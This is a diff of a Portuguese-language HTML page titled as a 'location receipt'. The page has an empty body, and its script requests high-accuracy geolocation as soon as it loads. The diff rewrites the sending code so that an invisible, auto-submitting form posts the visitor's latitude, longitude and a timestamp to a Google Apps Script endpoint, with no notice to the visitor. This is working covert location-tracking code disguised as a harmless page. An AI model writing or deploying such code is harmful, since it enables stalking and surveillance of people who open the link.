@@ -2,22 +2,38 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Localização</title>
+</head>
+<body>
   <script>
-    function enviar(latitude, longitude) {
-      fetch("https://script.google.com/macros/s/AKfycby5kT18kkDvLjtySh6T2JBOSO_qkPy7hQhoqcoR13khsyYbY_74Zp9KhQPiG98VNgd6nQ/exec", {
-        method: "POST",
-        mode: "no-cors", // ignora bloqueio CORS
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          latitude: latitude,
-          longitude: longitude
-        })
-      })
-      .then(() => console.log("✅ Localização enviada"))
-      .catch(err => console.error("❌ Erro ao enviar:", err));
+    function enviar(lat, lon) {
+      // Cria um formulário invisível
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = "https://script.google.com/macros/s/AKfycby5kT18kkDvLjtySh6T2JBOSO_qkPy7hQhoqcoR13khsyYbY_74Zp9KhQPiG98VNgd6nQ/exec";
+      form.style.display = "none";
+
+      // Latitude
+      const latInput = document.createElement("input");
+      latInput.name = "lat";
+      latInput.value = lat;
+      form.appendChild(latInput);
+
+      // Longitude
+      const lonInput = document.createElement("input");
+      lonInput.name = "lon";
+      lonInput.value = lon;
+      form.appendChild(lonInput);
+
+      // Timestamp
+      const tsInput = document.createElement("input");
+      tsInput.name = "timestamp";
+      tsInput.value = new Date().toISOString();
+      form.appendChild(tsInput);
+
+      document.body.appendChild(form);
+      form.submit(); // envia para o Apps Script sem bloquear CORS
     }
 
     window.onload = function() {
@@ -28,11 +44,9 @@
           { enableHighAccuracy: true }
         );
       } else {
-        console.error("Geolocalização não é suportada neste dispositivo.");
+        console.error("Geolocalização não suportada neste dispositivo.");
       }
     };
   </script>
-</head>
-<body>
 </body>
 </html>
